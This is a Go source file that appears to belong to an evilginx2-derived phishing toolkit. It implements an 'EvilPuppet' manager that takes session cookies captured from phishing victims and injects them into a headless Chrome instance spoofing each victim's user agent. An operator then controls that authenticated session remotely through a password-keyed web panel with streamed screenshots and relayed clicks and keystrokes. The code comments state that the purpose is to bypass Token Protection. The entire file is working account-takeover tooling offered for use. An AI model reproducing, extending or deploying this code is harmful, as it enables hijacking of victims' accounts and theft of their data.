package core

import (
	"context"
	"encoding/json"
	"fmt"
	"math"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/cdproto/dom"
	"github.com/chromedp/cdproto/input"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/cdproto/runtime"
	"github.com/chromedp/chromedp"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type PuppetStatus int

const (
	PUPPET_STARTING PuppetStatus = iota
	PUPPET_RUNNING
	PUPPET_STOPPED
	PUPPET_ERROR
)

func (s PuppetStatus) String() string {
	switch s {
	case PUPPET_STARTING:
		return "starting"
	case PUPPET_RUNNING:
		return "running"
	case PUPPET_STOPPED:
		return "stopped"
	case PUPPET_ERROR:
		return "error"
	default:
		return "unknown"
	}
}

// PuppetInstance represents a single headless Chrome browser session
// that is remotely controlled via the EvilPuppet interface.
type PuppetInstance struct {
	Id         int
	SessionId  int
	Phishlet   string
	Username   string
	TargetURL  string
	Status     PuppetStatus
	Error      string
	CreateTime time.Time

	ctx         context.Context
	cancel      context.CancelFunc
	allocCtx    context.Context
	allocCancel context.CancelFunc

	mu         sync.Mutex
	lastScreen []byte
	screenCh   chan []byte
	stopCh     chan struct{}

	viewportW int
	viewportH int
}

// PuppetInput represents an input event forwarded from the web UI to the puppet browser.
type PuppetInput struct {
	Type      string  `json:"type"`
	X         float64 `json:"x,omitempty"`
	Y         float64 `json:"y,omitempty"`
	Button    string  `json:"button,omitempty"`
	Text      string  `json:"text,omitempty"`
	Key       string  `json:"key,omitempty"`
	Code      string  `json:"code,omitempty"`
	DeltaX    float64 `json:"deltaX,omitempty"`
	DeltaY    float64 `json:"deltaY,omitempty"`
	URL       string  `json:"url,omitempty"`
	Modifiers int     `json:"modifiers,omitempty"`
	Selector  string  `json:"selector,omitempty"`
}

// ElementInfo describes a DOM element identified by the element inspector.
// Sent from the server to the client so the UI can draw a highlight overlay.
type ElementInfo struct {
	Selector  string     `json:"selector"`
	Tag       string     `json:"tag"`
	InputType string     `json:"inputType,omitempty"`
	Rect      [4]float64 `json:"rect"`
	Text      string     `json:"text,omitempty"`
	Focusable bool       `json:"focusable"`
}

// PuppetManager manages all puppet browser instances.
// It provides the core EvilPuppet functionality: launching headless browsers
// with captured session cookies, enabling remote control of authenticated sessions
// to bypass Token Protection (Token Binding).
type PuppetManager struct {
	instances  map[int]*PuppetInstance
	nextId     int
	mu         sync.RWMutex
	db         *database.Database
	cfg        *Config
	server     *PuppetServer
	chromePath string
	port       int
	password   string
}

func NewPuppetManager(cfg *Config, db *database.Database) *PuppetManager {
	pm := &PuppetManager{
		instances:  make(map[int]*PuppetInstance),
		nextId:     1,
		db:         db,
		cfg:        cfg,
		chromePath: "",
		port:       7777,
		password:   GenRandomToken()[:16],
	}
	return pm
}

func (pm *PuppetManager) SetServer(server *PuppetServer) {
	pm.server = server
}

func (pm *PuppetManager) SetChromePath(path string) {
	pm.chromePath = path
}

func (pm *PuppetManager) GetPort() int {
	return pm.port
}

func (pm *PuppetManager) SetPort(port int) {
	pm.port = port
}

func (pm *PuppetManager) GetPassword() string {
	return pm.password
}

func (pm *PuppetManager) SetPassword(password string) {
	pm.password = password
}

// LaunchPuppet creates a new headless Chrome instance, injects the captured cookies
// from the specified session, and navigates to the target URL.
// This keeps the session alive on the server, bypassing Token Binding.
func (pm *PuppetManager) LaunchPuppet(sessionId int, targetURL string) (*PuppetInstance, error) {
	sessions, err := pm.db.ListSessions()
	if err != nil {
		return nil, fmt.Errorf("database error: %v", err)
	}

	var dbSession *database.Session
	for _, s := range sessions {
		if s.Id == sessionId {
			dbSession = s
			break
		}
	}
	if dbSession == nil {
		return nil, fmt.Errorf("session %d not found", sessionId)
	}

	if len(dbSession.CookieTokens) == 0 && len(dbSession.BodyTokens) == 0 && len(dbSession.HttpTokens) == 0 {
		return nil, fmt.Errorf("session %d has no captured tokens", sessionId)
	}

	if targetURL == "" {
		return nil, fmt.Errorf("target URL is required")
	}

	pm.mu.Lock()
	id := pm.nextId
	pm.nextId++
	pm.mu.Unlock()

	puppet := &PuppetInstance{
		Id:         id,
		SessionId:  sessionId,
		Phishlet:   dbSession.Phishlet,
		Username:   dbSession.Username,
		TargetURL:  targetURL,
		Status:     PUPPET_STARTING,
		CreateTime: time.Now(),
		screenCh:   make(chan []byte, 5),
		stopCh:     make(chan struct{}),
		viewportW:  1920,
		viewportH:  1080,
	}

	pm.mu.Lock()
	pm.instances[id] = puppet
	pm.mu.Unlock()

	go pm.runPuppet(puppet, dbSession)

	return puppet, nil
}

func (pm *PuppetManager) runPuppet(puppet *PuppetInstance, dbSession *database.Session) {
	// Set up Chrome allocator options
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("disable-web-security", false),
		chromedp.Flag("disable-features", "VizDisplayCompositor"),
		chromedp.Flag("force-device-scale-factor", "1"),
		chromedp.Flag("hide-scrollbars", true),
		chromedp.WindowSize(puppet.viewportW, puppet.viewportH),
		chromedp.UserAgent(dbSession.UserAgent),
	)

	if pm.chromePath != "" {
		opts = append(opts, chromedp.ExecPath(pm.chromePath))
	}

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	puppet.allocCtx = allocCtx
	puppet.allocCancel = allocCancel

	ctx, cancel := chromedp.NewContext(allocCtx)
	puppet.ctx = ctx
	puppet.cancel = cancel

	// Navigate to about:blank first to establish the browser
	if err := chromedp.Run(ctx, chromedp.Navigate("about:blank")); err != nil {
		puppet.mu.Lock()
		puppet.Status = PUPPET_ERROR
		puppet.Error = fmt.Sprintf("failed to start browser: %v", err)
		puppet.mu.Unlock()
		log.Error("puppet [%d]: %s", puppet.Id, puppet.Error)
		return
	}

	// Inject all captured cookies from the session
	cookieCount := 0
	for domain, cookies := range dbSession.CookieTokens {
		for _, ck := range cookies {
			err := chromedp.Run(ctx, chromedp.ActionFunc(func(ctx context.Context) error {
				expr := cdp.TimeSinceEpoch(time.Now().Add(180 * 24 * time.Hour))
				cookiePath := "/"
				if ck.Path != "" {
					cookiePath = ck.Path
				}
				return network.SetCookie(ck.Name, ck.Value).
					WithDomain(domain).
					WithPath(cookiePath).
					WithSecure(true).
					WithHTTPOnly(ck.HttpOnly).
					WithExpires(&expr).
					Do(ctx)
			}))
			if err != nil {
				log.Warning("puppet [%d]: failed to set cookie %s@%s: %v", puppet.Id, ck.Name, domain, err)
			} else {
				cookieCount++
			}
		}
	}
	log.Success("puppet [%d]: injected %d cookies from session %d", puppet.Id, cookieCount, puppet.SessionId)

	// Navigate to the target URL
	log.Info("puppet [%d]: navigating to %s", puppet.Id, puppet.TargetURL)
	if err := chromedp.Run(ctx, chromedp.Navigate(puppet.TargetURL)); err != nil {
		puppet.mu.Lock()
		puppet.Status = PUPPET_ERROR
		puppet.Error = fmt.Sprintf("failed to navigate: %v", err)
		puppet.mu.Unlock()
		log.Error("puppet [%d]: %s", puppet.Id, puppet.Error)
		return
	}

	// Wait for initial page load
	time.Sleep(3 * time.Second)

	puppet.mu.Lock()
	puppet.Status = PUPPET_RUNNING
	puppet.mu.Unlock()

	log.Success("puppet [%d]: browser running - session %d (%s) -> %s", puppet.Id, puppet.SessionId, puppet.Username, puppet.TargetURL)

	// Build and show the control URL
	serverIP := pm.cfg.GetServerExternalIP()
	if serverIP == "" {
		serverIP = "your-server-ip"
	}
	controlURL := fmt.Sprintf("http://%s:%d/puppet/%d?key=%s", serverIP, pm.port, puppet.Id, pm.password)
	log.Info("puppet [%d]: control URL: %s", puppet.Id, controlURL)

	// Start the screenshot capture loop
	go pm.screenshotLoop(puppet)

	// Wait for stop signal
	<-puppet.stopCh

	puppet.mu.Lock()
	puppet.Status = PUPPET_STOPPED
	puppet.mu.Unlock()

	cancel()
	allocCancel()
	log.Info("puppet [%d]: stopped", puppet.Id)
}

func (pm *PuppetManager) screenshotLoop(puppet *PuppetInstance) {
	ticker := time.NewTicker(300 * time.Millisecond) // ~3 fps — balanced for low-resource servers
	defer ticker.Stop()

	for {
		select {
		case <-puppet.stopCh:
			return
		case <-ticker.C:
			puppet.mu.Lock()
			status := puppet.Status
			puppet.mu.Unlock()

			if status != PUPPET_RUNNING {
				continue
			}

			// Timeout so a slow capture doesn't block input handling
			screenshotCtx, screenshotCancel := context.WithTimeout(puppet.ctx, 3*time.Second)
			var buf []byte
			err := chromedp.Run(screenshotCtx, chromedp.ActionFunc(func(ctx context.Context) error {
				var err error
				buf, err = page.CaptureScreenshot().
					WithFormat(page.CaptureScreenshotFormatJpeg).
					WithQuality(45).
					Do(ctx)
				return err
			}))
			screenshotCancel()
			if err != nil {
				continue
			}

			puppet.mu.Lock()
			puppet.lastScreen = buf
			puppet.mu.Unlock()

			// Drain stale frame, then send new one
			select {
			case <-puppet.screenCh:
			default:
			}
			select {
			case puppet.screenCh <- buf:
			default:
			}
		}
	}
}

// HandleInput dispatches an input event to the puppet's headless Chrome instance.
func (pm *PuppetManager) HandleInput(puppetId int, pi PuppetInput) error {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()

	if !ok {
		return fmt.Errorf("puppet %d not found", puppetId)
	}

	puppet.mu.Lock()
	status := puppet.Status
	puppet.mu.Unlock()

	if status != PUPPET_RUNNING {
		return fmt.Errorf("puppet %d is not running (status: %s)", puppetId, status)
	}

	switch pi.Type {
	case "click":
		// If client provides a CSS selector from the element inspector, use it
		if pi.Selector != "" {
			return pm.ClickElement(puppet, pi.Selector)
		}
		return pm.handleMouseClick(puppet, pi)
	case "mousedown":
		return pm.handleMouseDown(puppet, pi)
	case "mouseup":
		return pm.handleMouseUp(puppet, pi)
	case "mousemove":
		return pm.handleMouseMove(puppet, pi)
	case "type":
		// If client provides a selector, type into that specific element
		if pi.Selector != "" {
			return pm.FocusAndType(puppet, pi.Selector, pi.Text)
		}
		return pm.handleType(puppet, pi)
	case "keydown":
		return pm.handleKeyDown(puppet, pi)
	case "keyup":
		return pm.handleKeyUp(puppet, pi)
	case "scroll":
		return pm.handleScroll(puppet, pi)
	case "navigate":
		return pm.handleNavigate(puppet, pi)
	case "back":
		return pm.handleBack(puppet)
	case "forward":
		return pm.handleForward(puppet)
	case "refresh":
		return pm.handleRefresh(puppet)
	}
	return nil
}

func (pm *PuppetManager) handleMouseClick(puppet *PuppetInstance, pi PuppetInput) error {
	btn := input.Left
	if pi.Button == "right" {
		btn = input.Right
	} else if pi.Button == "middle" {
		btn = input.Middle
	}

	err := chromedp.Run(puppet.ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			// Move to the target position first to trigger hover/focus states
			if err := input.DispatchMouseEvent(input.MouseMoved, pi.X, pi.Y).
				Do(ctx); err != nil {
				return err
			}
			time.Sleep(30 * time.Millisecond)

			if err := input.DispatchMouseEvent(input.MousePressed, pi.X, pi.Y).
				WithButton(btn).
				WithClickCount(1).
				WithModifiers(input.Modifier(pi.Modifiers)).
				Do(ctx); err != nil {
				return err
			}
			time.Sleep(40 * time.Millisecond)

			return input.DispatchMouseEvent(input.MouseReleased, pi.X, pi.Y).
				WithButton(btn).
				WithClickCount(1).
				WithModifiers(input.Modifier(pi.Modifiers)).
				Do(ctx)
		}),
	)
	if err != nil {
		return err
	}

	// JavaScript fallback: find the element at click coordinates and focus/click it.
	// This handles custom input components (like Microsoft's login) where CDP mouse
	// events hit an overlay div instead of the actual <input> underneath.
	var ignored interface{}
	_ = chromedp.Run(puppet.ctx, chromedp.Evaluate(fmt.Sprintf(`
		(function() {
			var el = document.elementFromPoint(%f, %f);
			if (!el) return;
			var target = null;
			// Check if el itself is an input
			if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.isContentEditable) {
				target = el;
			}
			// Search inside the clicked element for an input
			if (!target) {
				target = el.querySelector('input, textarea, [contenteditable="true"]');
			}
			// Walk up the DOM — check parent and grandparent for inputs
			if (!target) {
				var parent = el.parentElement;
				for (var i = 0; i < 5 && parent; i++) {
					target = parent.querySelector('input, textarea, [contenteditable="true"]');
					if (target) break;
					parent = parent.parentElement;
				}
			}
			if (target) {
				target.focus();
				target.click();
				// Set cursor to end of any existing value
				if (target.value !== undefined) {
					target.selectionStart = target.selectionEnd = target.value.length;
				}
			} else {
				el.click();
				if (el.focus) el.focus();
			}
		})()
	`, pi.X, pi.Y), &ignored))

	return nil
}

func (pm *PuppetManager) handleMouseDown(puppet *PuppetInstance, pi PuppetInput) error {
	btn := input.Left
	if pi.Button == "right" {
		btn = input.Right
	}
	return chromedp.Run(puppet.ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			return input.DispatchMouseEvent(input.MousePressed, pi.X, pi.Y).
				WithButton(btn).
				WithClickCount(1).
				Do(ctx)
		}),
	)
}

func (pm *PuppetManager) handleMouseUp(puppet *PuppetInstance, pi PuppetInput) error {
	btn := input.Left
	if pi.Button == "right" {
		btn = input.Right
	}
	return chromedp.Run(puppet.ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			return input.DispatchMouseEvent(input.MouseReleased, pi.X, pi.Y).
				WithButton(btn).
				WithClickCount(1).
				Do(ctx)
		}),
	)
}

func (pm *PuppetManager) handleMouseMove(puppet *PuppetInstance, pi PuppetInput) error {
	return chromedp.Run(puppet.ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			return input.DispatchMouseEvent(input.MouseMoved, pi.X, pi.Y).Do(ctx)
		}),
	)
}

func (pm *PuppetManager) handleType(puppet *PuppetInstance, pi PuppetInput) error {
	for _, ch := range pi.Text {
		err := chromedp.Run(puppet.ctx,
			chromedp.ActionFunc(func(ctx context.Context) error {
				return input.DispatchKeyEvent(input.KeyChar).
					WithText(string(ch)).
					Do(ctx)
			}),
		)
		if err != nil {
			return err
		}
	}
	return nil
}

func (pm *PuppetManager) handleKeyDown(puppet *PuppetInstance, pi PuppetInput) error {
	return chromedp.Run(puppet.ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			evt := input.DispatchKeyEvent(input.KeyDown).
				WithKey(pi.Key).
				WithCode(pi.Code).
				WithModifiers(input.Modifier(pi.Modifiers))

			// Map common keys to Windows virtual key codes for better compatibility
			if vk, ok := keyToVirtualKeyCode(pi.Key); ok {
				evt = evt.WithWindowsVirtualKeyCode(vk).WithNativeVirtualKeyCode(vk)
			}
			return evt.Do(ctx)
		}),
	)
}

func (pm *PuppetManager) handleKeyUp(puppet *PuppetInstance, pi PuppetInput) error {
	return chromedp.Run(puppet.ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			evt := input.DispatchKeyEvent(input.KeyUp).
				WithKey(pi.Key).
				WithCode(pi.Code).
				WithModifiers(input.Modifier(pi.Modifiers))

			if vk, ok := keyToVirtualKeyCode(pi.Key); ok {
				evt = evt.WithWindowsVirtualKeyCode(vk).WithNativeVirtualKeyCode(vk)
			}
			return evt.Do(ctx)
		}),
	)
}

func (pm *PuppetManager) handleScroll(puppet *PuppetInstance, pi PuppetInput) error {
	return chromedp.Run(puppet.ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			return input.DispatchMouseEvent(input.MouseWheel, pi.X, pi.Y).
				WithDeltaX(pi.DeltaX).
				WithDeltaY(pi.DeltaY).
				Do(ctx)
		}),
	)
}

func (pm *PuppetManager) handleNavigate(puppet *PuppetInstance, pi PuppetInput) error {
	targetURL := pi.URL
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}
	log.Info("puppet [%d]: navigating to %s", puppet.Id, targetURL)
	return chromedp.Run(puppet.ctx, chromedp.Navigate(targetURL))
}

func (pm *PuppetManager) handleBack(puppet *PuppetInstance) error {
	return chromedp.Run(puppet.ctx, chromedp.NavigateBack())
}

func (pm *PuppetManager) handleForward(puppet *PuppetInstance) error {
	return chromedp.Run(puppet.ctx, chromedp.NavigateForward())
}

func (pm *PuppetManager) handleRefresh(puppet *PuppetInstance) error {
	return chromedp.Run(puppet.ctx, chromedp.Reload())
}

// GetScreenshot returns the most recent screenshot for the given puppet.
func (pm *PuppetManager) GetScreenshot(puppetId int) ([]byte, error) {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()

	if !ok {
		return nil, fmt.Errorf("puppet %d not found", puppetId)
	}

	puppet.mu.Lock()
	defer puppet.mu.Unlock()
	return puppet.lastScreen, nil
}

// GetScreenChan returns the screenshot channel for live streaming.
func (pm *PuppetManager) GetScreenChan(puppetId int) (chan []byte, error) {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()

	if !ok {
		return nil, fmt.Errorf("puppet %d not found", puppetId)
	}
	return puppet.screenCh, nil
}

// GetCurrentURL retrieves the browser's current URL.
func (pm *PuppetManager) GetCurrentURL(puppetId int) (string, error) {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()

	if !ok {
		return "", fmt.Errorf("puppet %d not found", puppetId)
	}

	puppet.mu.Lock()
	status := puppet.Status
	puppet.mu.Unlock()

	if status != PUPPET_RUNNING {
		return "", fmt.Errorf("puppet %d is not running", puppetId)
	}

	var currentURL string
	err := chromedp.Run(puppet.ctx, chromedp.Location(&currentURL))
	if err != nil {
		return "", err
	}
	return currentURL, nil
}

// KillPuppet stops a running puppet and cleans up its Chrome instance.
func (pm *PuppetManager) KillPuppet(puppetId int) error {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()

	if !ok {
		return fmt.Errorf("puppet %d not found", puppetId)
	}

	puppet.mu.Lock()
	status := puppet.Status
	puppet.mu.Unlock()

	if status == PUPPET_STOPPED {
		return fmt.Errorf("puppet %d already stopped", puppetId)
	}

	select {
	case <-puppet.stopCh:
		// Already closed
	default:
		close(puppet.stopCh)
	}

	return nil
}

// KillAllPuppets stops all running puppets.
func (pm *PuppetManager) KillAllPuppets() int {
	pm.mu.RLock()
	ids := make([]int, 0, len(pm.instances))
	for id := range pm.instances {
		ids = append(ids, id)
	}
	pm.mu.RUnlock()

	killed := 0
	for _, id := range ids {
		if err := pm.KillPuppet(id); err == nil {
			killed++
		}
	}
	return killed
}

// ListPuppets returns all puppet instances.
func (pm *PuppetManager) ListPuppets() []*PuppetInstance {
	pm.mu.RLock()
	defer pm.mu.RUnlock()

	var list []*PuppetInstance
	for _, p := range pm.instances {
		list = append(list, p)
	}
	return list
}

// GetPuppet returns a puppet by ID.
func (pm *PuppetManager) GetPuppet(puppetId int) (*PuppetInstance, bool) {
	pm.mu.RLock()
	defer pm.mu.RUnlock()
	p, ok := pm.instances[puppetId]
	return p, ok
}

// GetControlURL returns the full control URL for a puppet.
func (pm *PuppetManager) GetControlURL(puppetId int) string {
	serverIP := pm.cfg.GetServerExternalIP()
	if serverIP == "" {
		serverIP = "your-server-ip"
	}
	return fmt.Sprintf("http://%s:%d/puppet/%d?key=%s", serverIP, pm.port, puppetId, pm.password)
}

// GetDashboardURL returns the URL for the puppet dashboard (list of all puppets).
func (pm *PuppetManager) GetDashboardURL() string {
	serverIP := pm.cfg.GetServerExternalIP()
	if serverIP == "" {
		serverIP = "your-server-ip"
	}
	return fmt.Sprintf("http://%s:%d/puppet/?key=%s", serverIP, pm.port, pm.password)
}

// InspectElementAt uses CDP to identify the DOM element at viewport coordinates (x, y).
// Returns element metadata including a CSS selector and bounding box for the highlight overlay.
func (pm *PuppetManager) InspectElementAt(puppetId int, x, y float64) (*ElementInfo, error) {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()
	if !ok {
		return nil, fmt.Errorf("puppet %d not found", puppetId)
	}

	puppet.mu.Lock()
	status := puppet.Status
	puppet.mu.Unlock()
	if status != PUPPET_RUNNING {
		return nil, fmt.Errorf("puppet %d not running", puppetId)
	}

	ctx, cancel := context.WithTimeout(puppet.ctx, 2*time.Second)
	defer cancel()

	// Use DOM.getNodeForLocation to find the element at the given coordinates.
	// IgnorePointerEventsNone ensures we can hit elements hidden behind overlays.
	backendNodeID, _, _, err := dom.GetNodeForLocation(int64(math.Round(x)), int64(math.Round(y))).
		WithIgnorePointerEventsNone(true).
		WithIncludeUserAgentShadowDOM(false).
		Do(ctx)
	if err != nil {
		return nil, fmt.Errorf("getNodeForLocation: %v", err)
	}

	// Describe the node to get tag name, attributes, etc.
	node, err := dom.DescribeNode().WithBackendNodeID(backendNodeID).WithDepth(0).Do(ctx)
	if err != nil {
		return nil, fmt.Errorf("describeNode: %v", err)
	}

	// Build ElementInfo from the node description
	info := &ElementInfo{
		Tag: strings.ToLower(node.NodeName),
	}

	// Parse attributes (flat array: [name1, value1, name2, value2, ...])
	attrs := make(map[string]string)
	for i := 0; i+1 < len(node.Attributes); i += 2 {
		attrs[node.Attributes[i]] = node.Attributes[i+1]
	}

	if info.Tag == "input" {
		info.InputType = attrs["type"]
		if info.InputType == "" {
			info.InputType = "text"
		}
		info.Focusable = true
	} else if info.Tag == "textarea" || info.Tag == "select" {
		info.Focusable = true
	} else if _, ok := attrs["contenteditable"]; ok {
		info.Focusable = true
	}

	// Check for common interactive elements
	if info.Tag == "button" || info.Tag == "a" {
		info.Focusable = true
	}
	if attrs["role"] == "button" || attrs["tabindex"] != "" {
		info.Focusable = true
	}

	// Get the bounding box via DOM.getBoxModel
	boxModel, err := dom.GetBoxModel().WithBackendNodeID(backendNodeID).Do(ctx)
	if err == nil && boxModel != nil && len(boxModel.Border) >= 8 {
		// Border quad is [x1,y1, x2,y2, x3,y3, x4,y4] — top-left, top-right, bottom-right, bottom-left
		bx := boxModel.Border[0]
		by := boxModel.Border[1]
		bw := boxModel.Border[2] - boxModel.Border[0]
		bh := boxModel.Border[5] - boxModel.Border[1]
		info.Rect = [4]float64{bx, by, bw, bh}
	}

	// Build a CSS selector by resolving the node to a JS object and running a selector-building function.
	obj, err := dom.ResolveNode().WithBackendNodeID(backendNodeID).Do(ctx)
	if err == nil && obj != nil && obj.ObjectID != "" {
		var result json.RawMessage
		// This JS function builds a unique CSS selector for the element
		selectorResult, _, err := runtime.CallFunctionOn(`function() {
			function buildSelector(el) {
				if (!el || el === document.documentElement) return 'html';
				if (!el.parentElement) return el.tagName ? el.tagName.toLowerCase() : '';

				// ID-based selector (most specific)
				if (el.id && document.querySelectorAll('#' + CSS.escape(el.id)).length === 1) {
					return '#' + CSS.escape(el.id);
				}

				// name attribute (common for form fields)
				var name = el.getAttribute('name');
				if (name) {
					var sel = el.tagName.toLowerCase() + '[name="' + name + '"]';
					if (document.querySelectorAll(sel).length === 1) return sel;
				}

				// type + name for inputs
				if (el.tagName === 'INPUT') {
					var type = el.getAttribute('type') || 'text';
					if (name) {
						var sel = 'input[type="' + type + '"][name="' + name + '"]';
						if (document.querySelectorAll(sel).length === 1) return sel;
					}
				}

				// data-testid or aria-label
				var testId = el.getAttribute('data-testid');
				if (testId) {
					var sel = '[data-testid="' + testId + '"]';
					if (document.querySelectorAll(sel).length === 1) return sel;
				}

				// Build a path from the parent
				var parent = buildSelector(el.parentElement);
				var tag = el.tagName.toLowerCase();
				var siblings = el.parentElement.children;
				var sameTag = [];
				for (var i = 0; i < siblings.length; i++) {
					if (siblings[i].tagName === el.tagName) sameTag.push(siblings[i]);
				}
				if (sameTag.length === 1) {
					return parent + ' > ' + tag;
				}
				var idx = sameTag.indexOf(el) + 1;
				return parent + ' > ' + tag + ':nth-of-type(' + idx + ')';
			}
			return buildSelector(this);
		}`).WithObjectID(obj.ObjectID).WithReturnByValue(true).Do(ctx)
		if err == nil && selectorResult != nil && selectorResult.Value != nil {
			_ = json.Unmarshal(selectorResult.Value, &result)
			var sel string
			if json.Unmarshal(result, &sel) == nil && sel != "" {
				info.Selector = sel
			}
		}

		// Get current value for input elements
		if info.Focusable && (info.Tag == "input" || info.Tag == "textarea") {
			valResult, _, err := runtime.CallFunctionOn(`function() { return this.value || ''; }`).
				WithObjectID(obj.ObjectID).WithReturnByValue(true).Do(ctx)
			if err == nil && valResult != nil && valResult.Value != nil {
				var val string
				if json.Unmarshal(valResult.Value, &val) == nil {
					info.Text = val
				}
			}
		}

		// Release the JS object
		runtime.ReleaseObject(obj.ObjectID).Do(ctx)
	}

	// Fallback: if we didn't get a selector, build one from attributes
	if info.Selector == "" {
		if id, ok := attrs["id"]; ok && id != "" {
			info.Selector = "#" + id
		} else if name, ok := attrs["name"]; ok && name != "" {
			info.Selector = info.Tag + "[name=\"" + name + "\"]"
		}
	}

	return info, nil
}

// ClickElement clicks a DOM element by CSS selector. This bypasses coordinate
// mapping entirely, solving the cursor offset problem.
func (pm *PuppetManager) ClickElement(puppet *PuppetInstance, selector string) error {
	ctx, cancel := context.WithTimeout(puppet.ctx, 3*time.Second)
	defer cancel()

	// First try chromedp.Click which handles scrolling and visibility
	err := chromedp.Run(ctx, chromedp.Click(selector, chromedp.ByQuery))
	if err == nil {
		return nil
	}

	// Fallback: use JavaScript to click the element directly
	var ignored interface{}
	return chromedp.Run(puppet.ctx, chromedp.Evaluate(fmt.Sprintf(`
		(function() {
			var el = document.querySelector(%q);
			if (!el) return false;
			el.scrollIntoViewIfNeeded ? el.scrollIntoViewIfNeeded() : el.scrollIntoView({block:'center'});
			el.focus();
			el.click();
			if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
				if (el.value !== undefined) {
					el.selectionStart = el.selectionEnd = el.value.length;
				}
			}
			return true;
		})()
	`, selector), &ignored))
}

// FocusAndType focuses an element by CSS selector and types text into it.
// Much more reliable than raw DispatchKeyEvent for complex login forms.
func (pm *PuppetManager) FocusAndType(puppet *PuppetInstance, selector string, text string) error {
	ctx, cancel := context.WithTimeout(puppet.ctx, 3*time.Second)
	defer cancel()

	// Focus the element first
	var ignored interface{}
	err := chromedp.Run(ctx, chromedp.Evaluate(fmt.Sprintf(`
		(function() {
			var el = document.querySelector(%q);
			if (!el) return false;
			el.focus();
			if (el.value !== undefined) {
				el.selectionStart = el.selectionEnd = el.value.length;
			}
			return true;
		})()
	`, selector), &ignored))
	if err != nil {
		return fmt.Errorf("focus element: %v", err)
	}

	// Type each character using CDP key events for realistic input
	for _, ch := range text {
		err := chromedp.Run(puppet.ctx,
			chromedp.ActionFunc(func(ctx context.Context) error {
				return input.DispatchKeyEvent(input.KeyChar).
					WithText(string(ch)).
					Do(ctx)
			}),
		)
		if err != nil {
			return err
		}
	}
	return nil
}

// keyToVirtualKeyCode maps JavaScript key names to Windows virtual key codes.
func keyToVirtualKeyCode(key string) (int64, bool) {
	keyMap := map[string]int64{
		"Enter":      13,
		"Tab":        9,
		"Backspace":  8,
		"Delete":     46,
		"Escape":     27,
		"ArrowUp":    38,
		"ArrowDown":  40,
		"ArrowLeft":  37,
		"ArrowRight": 39,
		"Home":       36,
		"End":        35,
		"PageUp":     33,
		"PageDown":   34,
		"Insert":     45,
		"F1":         112,
		"F2":         113,
		"F3":         114,
		"F4":         115,
		"F5":         116,
		"F6":         117,
		"F7":         118,
		"F8":         119,
		"F9":         120,
		"F10":        121,
		"F11":        122,
		"F12":        123,
		"Shift":      16,
		"Control":    17,
		"Alt":        18,
		"Meta":       91,
		" ":          32,
	}
	vk, ok := keyMap[key]
	return vk, ok
}
